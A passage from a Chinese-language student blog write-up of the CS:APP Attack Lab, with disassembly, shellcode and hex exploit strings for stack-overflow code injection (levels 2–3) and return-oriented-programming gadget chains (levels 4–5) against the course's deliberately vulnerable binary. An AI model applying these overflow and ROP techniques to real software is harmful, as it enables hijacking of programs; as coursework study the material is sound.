&lt;__printf_chk@plt&gt;</span><br><span class="line">  401818:	bf 02 00 00 00       	mov    $0x2,%edi</span><br><span class="line">  40181d:	e8 6b 04 00 00       	call   401c8d &lt;validate&gt;</span><br><span class="line">  401822:	eb 1e                	jmp    401842 &lt;touch2+0x56&gt;</span><br><span class="line">  401824:	be 10 31 40 00       	mov    $0x403110,%esi</span><br><span class="line">  401829:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  40182e:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401833:	e8 b8 f5 ff ff       	call   400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401838:	bf 02 00 00 00       	mov    $0x2,%edi</span><br><span class="line">  40183d:	e8 0d 05 00 00       	call   401d4f &lt;fail&gt;</span><br><span class="line">  401842:	bf 00 00 00 00       	mov    $0x0,%edi</span><br><span class="line">  401847:	e8 f4 f5 ff ff       	call   400e40 &lt;exit@plt&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>首先还是在保存返回地址的地方填充touch2的地址，接下来的难点在于如何将cookie填充到rdi中</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmp    0x202ce2(%rip),%edi    # if(val==cookie)</span><br></pre></td></tr></table></figure>
-
-<p>cookie的值储存在相对rip偏移0x202ce2的位置。<strong>思路：</strong> 仍然填充44个字节，最后四个字节填充我们编写的shellcode的地址，通过执行shellcode，rdi填充了cookie，并将touch2的地址pop进了栈，最后ret回到touch2。ret指令相当于pop ip，我们64位机器使用retq。</p>
-<p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230824222556.png"></p>
-<p>使用gdb进行调试，<code>b getbuf</code> 将断点设在getbuf函数，查看栈的地址，减去0x28之后，栈顶的地址是0x5561dc78。这是我们填充的数据</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov 0x59b997fa,%edi</span><br><span class="line">push touch2_address</span><br><span class="line">retq</span><br><span class="line">xxxxxxxxxxx</span><br><span class="line">xxxxxxxxxxx</span><br><span class="line">return_address</span><br></pre></td></tr></table></figure>
-
-<p>有一点要注意，栈是从高地址向低地址增长，而代码是从低地址往高地址执行所以填充之后栈空间应该是这样<img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230824231507.png">接下来是得到相应的字节码，首先用gcc进行汇编操作得到.o后缀的目标文件，然后用odjdump进行反汇编即可。<img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230824232603.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0:	bf fa 97 b9 59       	mov    $0x59b997fa,%edi</span><br><span class="line">5:	68 ec 17 40 00       	push   $0x4017ec</span><br><span class="line">c:	c3                   	ret    </span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bf fa 97 b9 59 68 ec 17</span><br><span class="line">40 00 c3 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230824234910.png"></p>
-<p>成功，中间犯了一个小错误，将<code>push $0x4017ec</code>写成了<code>push   0x4017ec</code>,其中前者代表的是立即数，后者则代表的内存地址处的值。</p>
-<h4 id="Level3："><a href="#Level3：" class="headerlink" title="Level3："></a>Level3：</h4><p>还是test调用完getbuf之后不返回test，而是执行touch3，touch3需要接收参数cookie，touch3中还调用了hexmatch函数，要传递两个参数。</p>
-<p><strong>思路：</strong> 不能直接ret到touch3中，应该像上一个挑战一样，先跳转到我们的shellcode，shellcode完成参数的传递以及ret到touch3。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="title function_">getbuf</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[BUFFER_SIZE];</span><br><span class="line">    Gets(buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    val = getbuf();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;No exploit.Getbuf returned 0x%x\n&quot;</span>,val);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">hexmatch</span><span class="params">(<span class="type">unsigned</span> val,<span class="type">char</span> *sval)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">  <span class="type">char</span>* s=cbuf+random()%<span class="number">100</span>;</span><br><span class="line">  <span class="built_in">sprintf</span>(s,<span class="string">&quot;%.8x&quot;</span>,val);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strncmp</span>(sval,s,<span class="number">9</span>)==<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">touch3</span><span class="params">(<span class="type">char</span>* sval)</span></span><br><span class="line">&#123;</span><br><span class="line">    vlevel=<span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span>(hexmatch(cookie,sval))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Touch3!:You called touch3(\&quot;%s\&quot;)\n,sval&quot;</span>);</span><br><span class="line">        calidate(<span class="number">3</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Misfire:You called touch3(\&quot;%s\&quot;)\n,sval&quot;</span>);</span><br><span class="line">        fail(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>汇编代码如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004017a8 &lt;getbuf&gt;:</span><br><span class="line">  4017a8:	48 83 ec 28          	sub    $0x28,%rsp</span><br><span class="line">  4017ac:	48 89 e7             	mov    %rsp,%rdi</span><br><span class="line">  4017af:	e8 8c 02 00 00       	call   401a40 &lt;Gets&gt;</span><br><span class="line">  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">  4017b9:	48 83 c4 28          	add    $0x28,%rsp</span><br><span class="line">  4017bd:	c3                   	ret    </span><br><span class="line">  4017be:	90                   	nop</span><br><span class="line">  4017bf:	90                   	nop</span><br><span class="line">  </span><br><span class="line">  0000000000401968 &lt;test&gt;:</span><br><span class="line">  401968:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  40196c:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401971:	e8 32 fe ff ff       	call   4017a8 &lt;getbuf&gt;         # push IP ; jmp getbuf</span><br><span class="line">  401976:	89 c2                	mov    %eax,%edx</span><br><span class="line">  401978:	be 88 31 40 00       	mov    $0x403188,%esi</span><br><span class="line">  40197d:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  401982:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401987:	e8 64 f4 ff ff       	call   400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  40198c:	48 83 c4 08          	add    $0x8,%rsp</span><br><span class="line">  401990:	c3                   	ret    </span><br><span class="line">  401991:	90                   	nop</span><br><span class="line">  </span><br><span class="line">  000000000040184c &lt;hexmatch&gt;:</span><br><span class="line">  40184c:	41 54                	push   %r12</span><br><span class="line">  40184e:	55                   	push   %rbp</span><br><span class="line">  40184f:	53                   	push   %rbx</span><br><span class="line">  401850:	48 83 c4 80          	add    $0xffffffffffffff80,%rsp    #-128</span><br><span class="line">  401854:	41 89 fc             	mov    %edi,%r12d</span><br><span class="line">  401857:	48 89 f5             	mov    %rsi,%rbp</span><br><span class="line">  40185a:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax</span><br><span class="line">  401861:	00 00 </span><br><span class="line">  401863:	48 89 44 24 78       	mov    %rax,0x78(%rsp)</span><br><span class="line">  401868:	31 c0                	xor    %eax,%eax</span><br><span class="line">  40186a:	e8 41 f5 ff ff       	call   400db0 &lt;random@plt&gt;</span><br><span class="line">  40186f:	48 89 c1             	mov    %rax,%rcx</span><br><span class="line">  401872:	48 ba 0b d7 a3 70 3d 	movabs $0xa3d70a3d70a3d70b,%rdx</span><br><span class="line">  401879:	0a d7 a3 </span><br><span class="line">  40187c:	48 f7 ea             	imul   %rdx</span><br><span class="line">  40187f:	48 01 ca             	add    %rcx,%rdx</span><br><span class="line">  401882:	48 c1 fa 06          	sar    $0x6,%rdx</span><br><span class="line">  401886:	48 89 c8             	mov    %rcx,%rax</span><br><span class="line">  401889:	48 c1 f8 3f          	sar    $0x3f,%rax</span><br><span class="line">  40188d:	48 29 c2             	sub    %rax,%rdx</span><br><span class="line">  401890:	48 8d 04 92          	lea    (%rdx,%rdx,4),%rax</span><br><span class="line">  401894:	48 8d 04 80          	lea    (%rax,%rax,4),%rax</span><br><span class="line">  401898:	48 c1 e0 02          	shl    $0x2,%rax</span><br><span class="line">  40189c:	48 29 c1             	sub    %rax,%rcx</span><br><span class="line">  40189f:	48 8d 1c 0c          	lea    (%rsp,%rcx,1),%rbx</span><br><span class="line">  4018a3:	45 89 e0             	mov    %r12d,%r8d</span><br><span class="line">  4018a6:	b9 e2 30 40 00       	mov    $0x4030e2,%ecx</span><br><span class="line">  4018ab:	48 c7 c2 ff ff ff ff 	mov    $0xffffffffffffffff,%rdx</span><br><span class="line">  4018b2:	be 01 00 00 00       	mov    $0x1,%esi</span><br><span class="line">  4018b7:	48 89 df             	mov    %rbx,%rdi</span><br><span class="line">  4018ba:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  4018bf:	e8 ac f5 ff ff       	call   400e70 &lt;__sprintf_chk@plt&gt;</span><br><span class="line">  4018c4:	ba 09 00 00 00       	mov    $0x9,%edx</span><br><span class="line">  4018c9:	48 89 de             	mov    %rbx,%rsi</span><br><span class="line">  4018cc:	48 89 ef             	mov    %rbp,%rdi</span><br><span class="line">  4018cf:	e8 cc f3 ff ff       	call   400ca0 &lt;strncmp@plt&gt;</span><br><span class="line">  4018d4:	85 c0                	test   %eax,%eax</span><br><span class="line">  4018d6:	0f 94 c0             	sete   %al</span><br><span class="line">  4018d9:	0f b6 c0             	movzbl %al,%eax</span><br><span class="line">  4018dc:	48 8b 74 24 78       	mov    0x78(%rsp),%rsi</span><br><span class="line">  4018e1:	64 48 33 34 25 28 00 	xor    %fs:0x28,%rsi</span><br><span class="line">  4018e8:	00 00 </span><br><span class="line">  4018ea:	74 05                	je     4018f1 &lt;hexmatch+0xa5&gt;</span><br><span class="line">  4018ec:	e8 ef f3 ff ff       	call   400ce0 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">  4018f1:	48 83 ec 80          	sub    $0xffffffffffffff80,%rsp</span><br><span class="line">  4018f5:	5b                   	pop    %rbx</span><br><span class="line">  4018f6:	5d                   	pop    %rbp</span><br><span class="line">  4018f7:	41 5c                	pop    %r12</span><br><span class="line">  4018f9:	c3                   	ret    </span><br><span class="line"></span><br><span class="line">00000000004018fa &lt;touch3&gt;:</span><br><span class="line">  4018fa:	53                   	push   %rbx</span><br><span class="line">  4018fb:	48 89 fb             	mov    %rdi,%rbx        #将rdi里的参数复制到rbx</span><br><span class="line">  4018fe:	c7 05 d4 2b 20 00 03 	movl   $0x3,0x202bd4(%rip)        # 6044dc &lt;vlevel&gt;</span><br><span class="line">  401905:	00 00 00 </span><br><span class="line">  401908:	48 89 fe             	mov    %rdi,%rsi  #参数sval</span><br><span class="line">  40190b:	8b 3d d3 2b 20 00    	mov    0x202bd3(%rip),%edi        # 6044e4 &lt;cookie&gt;</span><br><span class="line">  401911:	e8 36 ff ff ff       	call   40184c &lt;hexmatch&gt;</span><br><span class="line">  401916:	85 c0                	test   %eax,%eax</span><br><span class="line">  401918:	74 23                	je     40193d &lt;touch3+0x43&gt;</span><br><span class="line">  40191a:	48 89 da             	mov    %rbx,%rdx</span><br><span class="line">  40191d:	be 38 31 40 00       	mov    $0x403138,%esi</span><br><span class="line">  401922:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  401927:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  40192c:	e8 bf f4 ff ff       	call   400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401931:	bf 03 00 00 00       	mov    $0x3,%edi</span><br><span class="line">  401936:	e8 52 03 00 00       	call   401c8d &lt;validate&gt;</span><br><span class="line">  40193b:	eb 21                	jmp    40195e &lt;touch3+0x64&gt;</span><br><span class="line">  40193d:	48 89 da             	mov    %rbx,%rdx</span><br><span class="line">  401940:	be 60 31 40 00       	mov    $0x403160,%esi</span><br><span class="line">  401945:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  40194a:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  40194f:	e8 9c f4 ff ff       	call   400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401954:	bf 03 00 00 00       	mov    $0x3,%edi</span><br><span class="line">  401959:	e8 f1 03 00 00       	call   401d4f &lt;fail&gt;</span><br><span class="line">  40195e:	bf 00 00 00 00       	mov    $0x0,%edi</span><br><span class="line">  401963:	e8 d8 f4 ff ff       	call   400e40 &lt;exit@plt&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>首先调用touch3之前，要确保rdi中有指针，注意参数类型是char*而上一个挑战 <code>void touch2(unsigned val)</code>参数是一个无符号整型，所以这一次我们还要创建一个字符串被rdi中的指针所指。字符串是“59b997fa”，我们将字符串的ascii输入。</p>
-<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">db <span class="string">&quot;59b997fa&quot;</span><span class="punctuation">,</span><span class="number">0</span></span><br><span class="line">mov <span class="variable">%sval_address</span> <span class="punctuation">,</span><span class="variable">%rdi</span></span><br><span class="line">push <span class="variable">%touch3_address</span></span><br><span class="line"><span class="keyword">ret</span></span><br></pre></td></tr></table></figure>
-
-<p>字符串是以**’\0’**结尾的，其ascii是0，检测到0计算机就是到字符串结束了。我们只要将字符串的首地址放入寄存器rdi即可。题目描述中还提到<img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825132143.png"></p>
-<p>可以看到在调用了hexmatch之后，连续push了三次<img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825132422.png"></p>
-<p>所以临近返回地址的地方不要存放数据。<img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825133258.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0:	48 c7 c7 78 dc 61 55 	mov    $0x5561dc78,%rdi</span><br><span class="line">7:	68 fa 18 40 00       	push   $0x4018fa</span><br><span class="line">c:	c3                   	ret    </span><br></pre></td></tr></table></figure>
-
-<p>所以：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">35 39 62 39 39 37 66 61 </span><br><span class="line">00 48 c7 c7 78 dc 61 55</span><br><span class="line">68 fa 18 40 00 c3 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">81 dc 61 55</span><br></pre></td></tr></table></figure>
-
-<p>注意，最后的四字节的地址不再是栈顶的位置，因为我们的字符串是存放在栈顶的，ret到栈顶程序不会向下执行，我们要ret到mov指令的地址。81&#x3D;78+9</p>
-<p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825135929.png"></p>
-<p>失败了，猜测应该还是被hexmatch和strcmp压入的数据覆盖了，参考了一下，原来还可以将字符串放置在第44个字节后面，即test的栈帧中，因为我们不在返回test所以覆盖那里也没什么影响。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0:	48 c7 c7 a8 dc 61 55 	mov    $0x5561dca8,%rdi</span><br><span class="line">7:	68 fa 18 40 00       	push   $0x4018fa</span><br><span class="line">c:	c3                   	ret  </span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">48 c7 c7 a8 dc 61 55 68</span><br><span class="line">fa 18 40 00 c3 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br><span class="line">35 39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure>
-
-<p>注意不能直接跟在44字节后面，因为64位机器ret指令相当于pop八个字节，pop之后rsp+8，所以字符串要在返回地址八个字节之后.0x5561dca8&#x3D;0x5561dc78+0x2c（48字节）。</p>
-<p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825141847.png"></p>
-<p>成功！！！</p>
-<h3 id="实验部分2面向返回的编程："><a href="#实验部分2面向返回的编程：" class="headerlink" title="实验部分2面向返回的编程："></a>实验部分2面向返回的编程：</h3><p>这一部分难度增加，上一部分挑战栈既没有<strong>随机化</strong>也没有<strong>不可执行的内存标记</strong>。栈空间被标记为不可执行区域，所以我们不再能使用注入的shellcode。接下来的挑战要用到ROP ( Return-oriented Programming )即面向返回的编程。</p>
-<p><strong>ROP原理：</strong>		 </p>
-<p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825205403.png"></p>
-<p>我们注入的内容被划分为一个个gadget，其实是一个个地址，gatcode有一个显著的特点，即最后一字节内容为c3即ret的机器码，这样一个个gatget就有ret指令连接了起来。既然栈内空间不可执行，那么这个地址要指向哪里呢？答案是程序现有的代码段，举例来说<img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825210000.png"></p>
-<p>这是一个函数，看起来没什么特别，也没有什么攻击性，但是转化为它的机器级表示<img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825210117.png"></p>
-<p>其中 <code>48 89 c7</code>是 <code>mov %rax,rdi</code>的机器码，我们只要在返回地址处填充0x400f18(起始地址400f15往后三个字节)即可执行<code>mov %rax,rdi</code>并且由ret弹出栈内的下一个地址继续操作。PDF给出了几张供我们参考攻击的表<img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825210817.png">                </p>
-<p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825210825.png"></p>
-<p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825210838.png"></p>
-<p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825210846.png"></p>
-<p>好，接下来开搞。！！！</p>
-<h4 id="Level4："><a href="#Level4：" class="headerlink" title="Level4："></a>Level4：</h4><p>这个挑战和2要达到相同的目的，即test在调用完getbuf之后返回执行touch2，执行touch2之前要往%rdi中传递参数cookie。在level2中我们直接在栈中注入了<code>mov cookie，%rdi</code> 的机器码，这次挑战我们只能利用现有的代码执行。</p>
-<p>分为两步，cookie在我们注入的字符串中，要通过pop指令将cookie弹到rdi中，对应的机器码是 <code>5f</code>，可惜的是在给出的gadget中并没有5f，所以我们只能先将cookie弹到一个寄存器，再将这个寄存器的值复制到%rdi中</p>
-<p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825212912.png"></p>
-<p><code>48 89 c7</code>对应 <code>mov %rax,%rdi</code>,地址是0x4019a2</p>
-<p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825213149.png"></p>
-<p><code>58 90 c3</code> 对应 <code>popq %rax  ; nop ; ret</code> 。地址0x4019ab。接下来就该考虑注入的顺序了。</p>
-<p>touch2的地址：0x4017ec。cookie的值0x59b997fa</p>
-<p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825214129.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">ab 19 40 00 00 00 00 00</span><br><span class="line">fa 97 b9 59 00 00 00 00</span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">ec 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825221643.png"></p>
-<p>脑子抽了一直用上一个题目测试答案显示失败。。。</p>
-<h4 id="Level5："><a href="#Level5：" class="headerlink" title="Level5："></a>Level5：</h4><p>使用ROP完成level3。这是shellcode实现的操作：</p>
-<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">db <span class="string">&quot;59b997fa&quot;</span><span class="punctuation">,</span><span class="number">0</span></span><br><span class="line">mov <span class="variable">%sval_address</span> <span class="punctuation">,</span><span class="variable">%rdi</span></span><br><span class="line">push <span class="variable">%touch3_address</span></span><br><span class="line"><span class="keyword">ret</span></span><br></pre></td></tr></table></figure>
-
-<p>首先将字符串“35 39 62 39 39 37 66 61 0a 00”入栈，然后将其首地址pop到一个寄存器，然后复制到%edi，然后调用touch3，要考虑到hexmatch和strcmp对栈的影响。由于栈随机化的原因，我们不能直接获得字符串的地址，但是可以通过<code>movl %esp,xxx</code>指令得到当前的栈顶地址，计算出字符串的地址。<strong>movl以寄存器作为目的时会把高四个字节设置为0.</strong></p>
-<p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230826014517.png"></p>
-<p>只有一个选择 <code>48 89 e0</code> 即 <code>mov %rsp,%rax</code>  (或许89 e0),栈顶地址被放入%eax中,地址0x401a07。。。思考了良久之后，我发现无解了，因为仅靠寄存器之间的mov指令和pop指令不可能增加某个寄存器的值，所以我们放入%eax中的值不能发生变化，这显然不可能。</p>
-<p>看了提示之后才恍然大悟，题目并没有局限在mov，movl，popq指令之间，在提供的rop指令中存在大量的lea指令，之前学习过lea指令，加载有效地址，同时它可以进行四则混合运算，在这里我们需要他的<strong>加</strong>运算。<img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230826024848.png"></p>
-<p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230826025317.png"></p>
-<p>检索了全部lea相关的指令，发现只有一个能够使用（其他都是lea    -0x6fa78caf(%rdi),%eax格式，即将%rdi加上一个立即数赋值给%eax）。<code>lea （%rdi,%rsi,1）,%rax</code>的作用是rax&#x3D;rdi+rsi*1，有了这条指令的帮助我们就可以变更栈中存放的地址。<img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230826034218.png"></p>
-<p>只要按照这个思路，计算出X的值即可，实际操作过程中发现没有<code>pop %rsi</code>以及许多相关指令，最终只能用 <code>pop %rax ; mov eax,edx ; mov edx,ecx; mov ecx,esi </code>这四条指令来代替。</p>
-<p><code>pop %rax;ret</code>地址：0x4019ab</p>
-<p><code>mov eax,edx;ret</code>地址：0x401a42</p>
-<p><code>mov edx，ecx；ret</code>地址：0x401a69</p>
-<p><code>mov ecx,esi;ret</code>地址：0x401a13</p>
-<p><code>mov rsp,rax</code>地址：0x401aad</p>
-<p><code>mov rax,rdi</code>地址：0x4019a2</p>
-<p><code>lea    (%rdi,%rsi,1),%rax</code>地址：0x4019d6</p>
-<p><code>mov rax,rdi</code>地址：0x4019a2</p>
-<p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230826133126.png"></p>
-<p>通过计算，执行mov rsp，rdi的时候rsp的值是48，cookie相对它32个字节即0x20</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">ab 19 40 00 00 00 00 00</span><br><span class="line">20 00 00 00 00 00 00 00</span><br><span class="line">42 1a 40 00 00 00 00 00</span><br><span class="line">69 1a 40 00 00 00 00 00</span><br><span class="line">13 1a 40 00 00 00 00 00</span><br><span class="line">ad 1a 40 00 00 00 00 00</span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">d6 19 40 00 00 00 00 00</span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">fa 18 40 00 00 00 00 00</span><br><span class="line">35 39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230826133108.png"></p>
-<p>over，学到了很多^_^</p>
-]]></content>
-      <tags>
-        <tag>csapp</tag>
-        <tag>lab</tag>
-      </tags>
   </entry>
 </search>
